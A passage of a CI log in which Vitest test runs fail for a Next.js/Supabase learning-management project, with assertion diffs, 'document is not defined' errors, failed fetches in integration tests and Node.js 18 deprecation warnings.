2025-11-18T17:35:29.2288688Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:29.2290365Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:29.2291173Z   hint: [32m''[39m,
2025-11-18T17:35:29.2291519Z   code: [32m''[39m
2025-11-18T17:35:29.2291814Z }
2025-11-18T17:35:29.2291965Z 
2025-11-18T17:35:29.2292417Z [31m     → expected [] to have a length of 2 but got +0[39m
2025-11-18T17:35:29.2294390Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetGroupAssignmentsForUser[2m > [22mhandles malformed block payloads gracefully[39m
2025-11-18T17:35:29.2295929Z [31m     → expected [] to have a length of 3 but got +0[39m
2025-11-18T17:35:29.2297833Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetOrCreateGroup[2m > [22mreturns existing group if found[39m
2025-11-18T17:35:29.2299491Z [31m     → expected null to deeply equal { id: 'group-123', …(2) }[39m
2025-11-18T17:35:29.2301290Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2.test.js[2m > [22mgroupAssignmentsV2Service[2m > [22mgetOrCreateGroup[2m > [22mcreates new group when none exists[39m
2025-11-18T17:35:29.2302801Z [31m     → expected null to deeply equal { id: 'new-group-123', …(2) }[39m
2025-11-18T17:35:29.6823132Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:29.6825417Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:29.6826711Z 
2025-11-18T17:35:29.7569024Z  [33m❯[39m __tests__/api/admin/user-roles.test.ts [2m ([22m[2m11 tests[22m [2m|[22m [31m10 failed[39m[2m)[22m[90m 63[2mms[22m[39m
2025-11-18T17:35:29.7590300Z [90mstderr[2m | __tests__/api/admin/user-roles.test.ts[2m > [22m[2m/api/admin/user-roles[2m > [22m[2mGET /api/admin/user-roles[2m > [22m[2mshould fetch user roles successfully and create audit log[22m[39m
2025-11-18T17:35:29.7593316Z Please utilize the `createPagesServerClient` function instead of the deprecated `createServerSupabaseClient` function. Learn more: https://supabase.com/docs/guides/auth/auth-helpers/nextjs-pages
2025-11-18T17:35:29.7599394Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mAuthentication[2m > [22mshould reject unauthenticated requests[39m
2025-11-18T17:35:29.7600669Z [31m     → expected "spy" to be called with arguments: [ 401 ]
2025-11-18T17:35:29.7601022Z 
2025-11-18T17:35:29.7601137Z Received: 
2025-11-18T17:35:29.7601291Z 
2025-11-18T17:35:29.7601411Z   1st spy call:
2025-11-18T17:35:29.7601574Z 
2025-11-18T17:35:29.7601685Z   Array [
2025-11-18T17:35:29.7601920Z -   401,
2025-11-18T17:35:29.7602159Z +   400,
2025-11-18T17:35:29.7602390Z   ]
2025-11-18T17:35:29.7602535Z 
2025-11-18T17:35:29.7602543Z 
2025-11-18T17:35:29.7602684Z Number of calls: 1
2025-11-18T17:35:29.7602985Z [39m
2025-11-18T17:35:29.7604243Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mAuthentication[2m > [22mshould reject non-admin users[39m
2025-11-18T17:35:29.7605441Z [31m     → expected "spy" to be called with arguments: [ 403 ]
2025-11-18T17:35:29.7605827Z 
2025-11-18T17:35:29.7605980Z Received: 
2025-11-18T17:35:29.7606148Z 
2025-11-18T17:35:29.7606282Z   1st spy call:
2025-11-18T17:35:29.7606462Z 
2025-11-18T17:35:29.7606582Z   Array [
2025-11-18T17:35:29.7607183Z -   403,
2025-11-18T17:35:29.7607484Z +   400,
2025-11-18T17:35:29.7607756Z   ]
2025-11-18T17:35:29.7607910Z 
2025-11-18T17:35:29.7607919Z 
2025-11-18T17:35:29.7608078Z Number of calls: 1
2025-11-18T17:35:29.7608497Z [39m
2025-11-18T17:35:29.7610264Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mGET /api/admin/user-roles[2m > [22mshould fetch user roles successfully and create audit log[39m
2025-11-18T17:35:29.7612360Z [31m     → expected 1st "spy" call to have been called with [ 'user_roles' ][39m
2025-11-18T17:35:29.7614198Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mGET /api/admin/user-roles[2m > [22mshould reject requests without userId[39m
2025-11-18T17:35:29.7615573Z [31m     → expected "spy" to be called with arguments: [ Array(1) ]
2025-11-18T17:35:29.7615947Z 
2025-11-18T17:35:29.7616054Z Received: 
2025-11-18T17:35:29.7616204Z 
2025-11-18T17:35:29.7616320Z   1st spy call:
2025-11-18T17:35:29.7616489Z 
2025-11-18T17:35:29.7616601Z   Array [
2025-11-18T17:35:29.7617141Z     Object {
2025-11-18T17:35:29.7617609Z -     "error": "Missing or invalid userId parameter",
2025-11-18T17:35:29.7618156Z +     "error": "userId is required",
2025-11-18T17:35:29.7618530Z     },
2025-11-18T17:35:29.7618777Z   ]
2025-11-18T17:35:29.7618905Z 
2025-11-18T17:35:29.7618927Z 
2025-11-18T17:35:29.7619052Z Number of calls: 1
2025-11-18T17:35:29.7619396Z [39m
2025-11-18T17:35:29.7620833Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mPOST /api/admin/user-roles[2m > [22mshould assign a role successfully[39m
2025-11-18T17:35:29.7622328Z [31m     → expected "spy" to be called with arguments: [ { user_id: 'admin-123', …(2) } ]
2025-11-18T17:35:29.7623092Z 
2025-11-18T17:35:29.7623232Z Received: 
2025-11-18T17:35:29.7623400Z 
2025-11-18T17:35:29.7623408Z 
2025-11-18T17:35:29.7623416Z 
2025-11-18T17:35:29.7623560Z Number of calls: 0
2025-11-18T17:35:29.7623889Z [39m
2025-11-18T17:35:29.7625258Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mPOST /api/admin/user-roles[2m > [22mshould validate role type[39m
2025-11-18T17:35:29.7626532Z [31m     → expected "spy" to be called with arguments: [ 400 ]
2025-11-18T17:35:29.7627064Z 
2025-11-18T17:35:29.7627186Z Received: 
2025-11-18T17:35:29.7627368Z 
2025-11-18T17:35:29.7627491Z   1st spy call:
2025-11-18T17:35:29.7627662Z 
2025-11-18T17:35:29.7627773Z   Array [
2025-11-18T17:35:29.7628024Z -   400,
2025-11-18T17:35:29.7628273Z +   405,
2025-11-18T17:35:29.7628521Z   ]
2025-11-18T17:35:29.7628660Z 
2025-11-18T17:35:29.7628668Z 
2025-11-18T17:35:29.7628807Z Number of calls: 1
2025-11-18T17:35:29.7629133Z [39m
2025-11-18T17:35:29.7630623Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mPOST /api/admin/user-roles[2m > [22mshould prevent duplicate role assignments[39m
2025-11-18T17:35:29.7631958Z [31m     → expected "spy" to be called with arguments: [ 409 ]
2025-11-18T17:35:29.7632307Z 
2025-11-18T17:35:29.7632430Z Received: 
2025-11-18T17:35:29.7632601Z 
2025-11-18T17:35:29.7632714Z   1st spy call:
2025-11-18T17:35:29.7632891Z 
2025-11-18T17:35:29.7633000Z   Array [
2025-11-18T17:35:29.7633254Z -   409,
2025-11-18T17:35:29.7633499Z +   405,
2025-11-18T17:35:29.7633765Z   ]
2025-11-18T17:35:29.7633900Z 
2025-11-18T17:35:29.7633908Z 
2025-11-18T17:35:29.7634048Z Number of calls: 1
2025-11-18T17:35:29.7634365Z [39m
2025-11-18T17:35:29.7635954Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mDELETE /api/admin/user-roles[2m > [22mshould remove a role successfully and create audit log[39m
2025-11-18T17:35:29.7637580Z [31m     → expected "spy" to be called at least once[39m
2025-11-18T17:35:29.7639345Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mDELETE /api/admin/user-roles[2m > [22mshould prevent removing the last admin role[39m
2025-11-18T17:35:29.7640727Z [31m     → expected "spy" to be called with arguments: [ 400 ]
2025-11-18T17:35:29.7641106Z 
2025-11-18T17:35:29.7641220Z Received: 
2025-11-18T17:35:29.7641381Z 
2025-11-18T17:35:29.7641501Z   1st spy call:
2025-11-18T17:35:29.7641676Z 
2025-11-18T17:35:29.7641796Z   Array [
2025-11-18T17:35:29.7642300Z -   400,
2025-11-18T17:35:29.7642550Z +   405,
2025-11-18T17:35:29.7642803Z   ]
2025-11-18T17:35:29.7642963Z 
2025-11-18T17:35:29.7642970Z 
2025-11-18T17:35:29.7643125Z Number of calls: 1
2025-11-18T17:35:29.7643471Z [39m
2025-11-18T17:35:29.7645037Z [31m   [33m❯[31m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mAudit Log Error Handling[2m > [22mshould still complete operation even if audit log fails[39m
2025-11-18T17:35:29.7646584Z [31m     → expected "spy" to be called with arguments: [ { success: true, …(1) } ]
2025-11-18T17:35:29.7647372Z 
2025-11-18T17:35:29.7647505Z Received: 
2025-11-18T17:35:29.7647671Z 
2025-11-18T17:35:29.7647803Z   1st spy call:
2025-11-18T17:35:29.7647988Z 
2025-11-18T17:35:29.7648107Z   Array [
2025-11-18T17:35:29.7648371Z     Object {
2025-11-18T17:35:29.7648687Z -     "roles": Array [
2025-11-18T17:35:29.7649018Z -       Object {
2025-11-18T17:35:29.7649348Z -         "id": "role-1",
2025-11-18T17:35:29.7649771Z -         "role_type": "consultor",
2025-11-18T17:35:29.7650247Z -         "user_id": "user-456",
2025-11-18T17:35:29.7650597Z -       },
2025-11-18T17:35:29.7650862Z -     ],
2025-11-18T17:35:29.7651152Z -     "success": true,
2025-11-18T17:35:29.7651621Z +     "error": "Error inesperado al obtener roles",
2025-11-18T17:35:29.7652037Z     },
2025-11-18T17:35:29.7652288Z   ]
2025-11-18T17:35:29.7652430Z 
2025-11-18T17:35:29.7652439Z 
2025-11-18T17:35:29.7652768Z Number of calls: 1
2025-11-18T17:35:29.7653110Z [39m
2025-11-18T17:35:29.7653766Z [user-roles API] Unexpected error: TypeError: _a.getHeader is not a function
2025-11-18T17:35:29.7655603Z     at NextServerAuthStorageAdapter.getCookie [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-helpers-nextjs/src/pagesServerClient.ts:29:22[90m)[39m
2025-11-18T17:35:29.7658327Z     at NextServerAuthStorageAdapter.getItem [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-helpers-shared/src/cookieAuthStorageAdapter.ts:24:22[90m)[39m
2025-11-18T17:35:29.7660466Z     at getItemAsync [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/lib/helpers.ts:130:31[90m)[39m
2025-11-18T17:35:29.7662374Z     at SupabaseAuthClient.__loadSession [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1541:46[90m)[39m
2025-11-18T17:35:29.7664458Z     at SupabaseAuthClient._useSession [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1499:33[90m)[39m
2025-11-18T17:35:29.7666139Z     at [90m/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1387:19
2025-11-18T17:35:29.7667734Z     at [90m/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1409:24
2025-11-18T17:35:29.7668413Z 
2025-11-18T17:35:29.7669983Z [90mstderr[2m | __tests__/api/admin/user-roles.test.ts[2m > [22m[2m/api/admin/user-roles[2m > [22m[2mAudit Log Error Handling[2m > [22m[2mshould still complete operation even if audit log fails[22m[39m
2025-11-18T17:35:29.7672477Z Please utilize the `createPagesServerClient` function instead of the deprecated `createServerSupabaseClient` function. Learn more: https://supabase.com/docs/guides/auth/auth-helpers/nextjs-pages
2025-11-18T17:35:29.7674168Z [user-roles API] Unexpected error: TypeError: _a.getHeader is not a function
2025-11-18T17:35:29.7675992Z     at NextServerAuthStorageAdapter.getCookie [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-helpers-nextjs/src/pagesServerClient.ts:29:22[90m)[39m
2025-11-18T17:35:29.7678627Z     at NextServerAuthStorageAdapter.getItem [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-helpers-shared/src/cookieAuthStorageAdapter.ts:24:22[90m)[39m
2025-11-18T17:35:29.7680736Z     at getItemAsync [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/lib/helpers.ts:130:31[90m)[39m
2025-11-18T17:35:29.7682850Z     at SupabaseAuthClient.__loadSession [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1541:46[90m)[39m
2025-11-18T17:35:29.7684886Z     at SupabaseAuthClient._useSession [90m(/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1499:33[90m)[39m
2025-11-18T17:35:29.7686588Z     at [90m/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1387:19
2025-11-18T17:35:29.7688314Z     at [90m/home/runner/work/fne-lms/fne-lms/[39mnode_modules/[4m@supabase[24m/auth-js/src/GoTrueClient.ts:1409:24
2025-11-18T17:35:29.7688943Z 
2025-11-18T17:35:30.3378516Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:30.3381757Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:30.3383065Z 
2025-11-18T17:35:30.3914255Z  [33m❯[39m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx [2m ([22m[2m17 tests[22m [2m|[22m [31m17 failed[39m[2m)[22m[90m 20[2mms[22m[39m
2025-11-18T17:35:30.3918740Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mBasic Rendering[2m > [22mrenders modal with assignment details[39m
2025-11-18T17:35:30.3920630Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3922036Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mBasic Rendering[2m > [22mshows loading state initially[39m
2025-11-18T17:35:30.3923118Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3924461Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mBasic Rendering[2m > [22mdisplays group members after loading[39m
2025-11-18T17:35:30.3925561Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3927129Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mshows resources section when resources exist[39m
2025-11-18T17:35:30.3928263Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3929639Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mdisplays all resources with correct information[39m
2025-11-18T17:35:30.3930746Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3932875Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mrenders correct icons for resource types[39m
2025-11-18T17:35:30.3935232Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3937421Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mmakes resources clickable with correct attributes[39m
2025-11-18T17:35:30.3938918Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3942822Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mdoes not show resources section when no resources[39m
2025-11-18T17:35:30.3945106Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3947167Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mhandles resources without descriptions[39m
2025-11-18T17:35:30.3948590Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3950615Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mResources Display[2m > [22mshows "Sin título" for resources without title[39m
2025-11-18T17:35:30.3952459Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3954524Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mSubmission Functionality[2m > [22menables submit button when content is provided[39m
2025-11-18T17:35:30.3956219Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3958378Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mSubmission Functionality[2m > [22mhandles submission with success[39m
2025-11-18T17:35:30.3959812Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3961719Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mSubmission Functionality[2m > [22mshows existing submission when available[39m
2025-11-18T17:35:30.3963166Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3965059Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mModal Interaction[2m > [22mcalls onClose when close button is clicked[39m
2025-11-18T17:35:30.3966671Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3968741Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mModal Interaction[2m > [22mcalls onClose when cancel button is clicked[39m
2025-11-18T17:35:30.3970148Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3972090Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mError Handling[2m > [22mshows error toast when submission has no content or file[39m
2025-11-18T17:35:30.3973539Z [31m     → document is not defined[39m
2025-11-18T17:35:30.3975317Z [31m   [33m❯[31m __tests__/components/assignments/GroupSubmissionModalV2.test.tsx[2m > [22mGroupSubmissionModalV2[2m > [22mError Handling[2m > [22mhandles submission errors gracefully[39m
2025-11-18T17:35:30.3976676Z [31m     → document is not defined[39m
2025-11-18T17:35:30.8123565Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:30.8127290Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:30.8128611Z 
2025-11-18T17:35:30.8780186Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:30.8781429Z Failed to create test data: {
2025-11-18T17:35:30.8782183Z   message: [32m'TypeError: fetch failed'[39m,
2025-11-18T17:35:30.8782862Z   details: [32m'TypeError: fetch failed\n'[39m +
2025-11-18T17:35:30.8783634Z     [32m'    at node:internal/deps/undici/undici:12637:11\n'[39m +
2025-11-18T17:35:30.8784483Z     [32m'    at processTicksAndRejections (node:internal/process/task_queues:95:5)\n'[39m +
2025-11-18T17:35:30.8785781Z     [32m'    at createTestDataWithExistingUser (/home/runner/work/fne-lms/fne-lms/__tests__/integration/learning-path-tracking-accuracy.test.ts:368:52)\n'[39m +
2025-11-18T17:35:30.8788240Z     [32m'    at /home/runner/work/fne-lms/fne-lms/__tests__/integration/learning-path-tracking-accuracy.test.ts:37:5\n'[39m +
2025-11-18T17:35:30.8789507Z     [32m'    at async Promise.all (index 0)\n'[39m +
2025-11-18T17:35:30.8792068Z     [32m'    at callSuiteHook (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:582:23)\n'[39m +
2025-11-18T17:35:30.8793654Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:765:27)\n'[39m +
2025-11-18T17:35:30.8794844Z     [32m'    at runSuite (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:782:15)\n'[39m +
2025-11-18T17:35:30.8796344Z     [32m'    at runFiles (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:834:5)\n'[39m +
2025-11-18T17:35:30.8797653Z     [32m'    at startTests (file:///home/runner/work/fne-lms/fne-lms/node_modules/@vitest/runner/dist/index.js:843:3)'[39m,
2025-11-18T17:35:30.8798363Z   hint: [32m''[39m,
2025-11-18T17:35:30.8798838Z   code: [32m''[39m
2025-11-18T17:35:30.8799235Z }
2025-11-18T17:35:30.8799492Z 
2025-11-18T17:35:31.0519004Z  [33m❯[39m __tests__/integration/learning-path-tracking-accuracy.test.ts [2m ([22m[2m7 tests[22m [2m|[22m [31m7 failed[39m[2m)[22m[90m 226[2mms[22m[39m
2025-11-18T17:35:31.0526118Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mSession Tracking Accuracy[2m > [22mshould accurately track session duration with heartbeats[39m
2025-11-18T17:35:31.0528304Z [31m     → document is not defined[39m
2025-11-18T17:35:31.0530048Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mSession Tracking Accuracy[2m > [22mshould track multiple activities and aggregate time correctly[39m
2025-11-18T17:35:31.0531377Z [31m     → document is not defined[39m
2025-11-18T17:35:31.0532675Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mSession Tracking Accuracy[2m > [22mshould handle session cleanup for abandoned sessions[39m
2025-11-18T17:35:31.0534421Z [31m     → Failed to parse URL from /api/cron/cleanup-learning-path-sessions[39m
2025-11-18T17:35:31.0537477Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mProgress Calculation Accuracy[2m > [22mshould accurately calculate learning path progress from session data[39m
2025-11-18T17:35:31.0539369Z [31m     → expected { …(4) } to be null[39m
2025-11-18T17:35:31.0541561Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mProgress Calculation Accuracy[2m > [22mshould handle 100% course completion correctly[39m
2025-11-18T17:35:31.0543241Z [31m     → Cannot read properties of null (reading 'progress')[39m
2025-11-18T17:35:31.0545555Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mAnalytics Reporting Accuracy[2m > [22mshould provide accurate analytics data from tracking sessions[39m
2025-11-18T17:35:31.0547972Z [31m     → Failed to parse URL from /api/learning-paths/analytics?pathId=test-path-1763487330869&dateRange=30[39m
2025-11-18T17:35:31.0550616Z [31m   [33m❯[31m __tests__/integration/learning-path-tracking-accuracy.test.ts[2m > [22mLearning Path Tracking Accuracy - Integration Tests[2m > [22mData Consistency Validation[2m > [22mshould maintain data consistency across all tracking tables[39m
2025-11-18T17:35:31.0552471Z [31m     → Cannot read properties of null (reading 'reduce')[39m
2025-11-18T17:35:31.0553181Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:31.0553583Z <empty line>
2025-11-18T17:35:31.0554031Z [90mstdout[2m | unknown test[22m[39m
2025-11-18T17:35:31.0554536Z ✅ Test data cleanup completed
2025-11-18T17:35:31.0554780Z 
2025-11-18T17:35:31.5592181Z [90mstderr[2m | unknown test[22m[39m
2025-11-18T17:35:31.5597592Z ⚠️  Node.js 18 and below are deprecated and will no longer be supported in future versions of @supabase/supabase-js. Please upgrade to Node.js 20 or later. For more information, visit: https://github.com/orgs/supabase/discussions/37217
2025-11-18T17:35:31.5598907Z 
2025-11-18T17:35:31.5678574Z  [33m❯[39m __tests__/lib/services/groupAssignmentsV2Admin.test.js [2m ([22m[2m9 tests[22m [2m|[22m [31m9 failed[39m[2m)[22m[90m 49[2mms[22m[39m
2025-11-18T17:35:31.5683926Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mRole-based access control[2m > [22mshould return empty array for non-admin/consultant users[39m
2025-11-18T17:35:31.5688003Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5690131Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mRole-based access control[2m > [22mshould allow access for admin users[39m
2025-11-18T17:35:31.5691960Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5694255Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mRole-based access control[2m > [22mshould filter courses for consultant users based on assignments[39m
2025-11-18T17:35:31.5696164Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5698496Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mFiltering functionality[2m > [22mshould filter by school_id[39m
2025-11-18T17:35:31.5700520Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5702480Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mFiltering functionality[2m > [22mshould filter by community_id[39m
2025-11-18T17:35:31.5703984Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5705764Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mPagination[2m > [22mshould paginate results correctly[39m
2025-11-18T17:35:31.5707617Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5709590Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mPagination[2m > [22mshould return empty array when offset exceeds total[39m
2025-11-18T17:35:31.5711182Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5713063Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mError handling[2m > [22mshould handle profile fetch errors[39m
2025-11-18T17:35:31.5714591Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:31.5716543Z [31m   [33m❯[31m __tests__/lib/services/groupAssignmentsV2Admin.test.js[2m > [22mgetAllAssignmentsForAdmin[2m > [22mError handling[2m > [22mshould handle course fetch errors gracefully[39m
2025-11-18T17:35:31.5718413Z [31m     → supabase.from.mockImplementation is not a function[39m
2025-11-18T17:35:32.0625197Z  [33m❯[39m __tests__/LearningQuizTaker.test.tsx [2m ([22m[2m19 tests[22m [2m|[22m [31m19 failed[39m[2m)[22m[90m 26[2mms[22m[39m
2025-11-18T17:35:32.0629738Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mInitial Rendering[2m > [22mshould render quiz title and first question[39m
2025-11-18T17:35:32.0631143Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0632108Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mInitial Rendering[2m > [22mshould not show any scores or points to students[39m
2025-11-18T17:35:32.0632840Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0633717Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mInitial Rendering[2m > [22mshould render multiple choice options[39m
2025-11-18T17:35:32.0634401Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0635583Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mNavigation[2m > [22mshould navigate between questions[39m
2025-11-18T17:35:32.0636219Z [31m     → document is not defined[39m
2025-11-18T17:35:32.0637371Z [31m   [33m❯[31m __tests__/LearningQuizTaker.test.tsx[2m > [22mLearningQuizTaker[2m > [22mNavigation[2m > [22mshould disable navigation buttons appropriately[39m
2025-11-18T17:35:32.0638079Z [31m     → document is not defined[39m
